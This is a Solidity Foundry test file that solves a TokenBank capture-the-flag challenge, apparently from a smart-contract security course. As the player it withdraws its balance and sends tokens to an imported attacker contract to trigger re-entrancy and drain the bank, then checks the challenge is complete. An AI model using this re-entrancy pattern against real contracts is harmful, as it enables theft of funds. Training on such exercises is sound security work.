// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/week-7-8/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {
    }

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here
        uint256 playerBalance = tokenBankChallenge.balanceOf(player);

        vm.startPrank(player);
        // withdraw balance from challenge
        tokenBankChallenge.withdraw(playerBalance);
        // transfer tokens to attacker and trigger re-entrancy
        tokenBankChallenge.token().transfer(address(tokenBankAttacker), playerBalance);

        vm.stopPrank();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}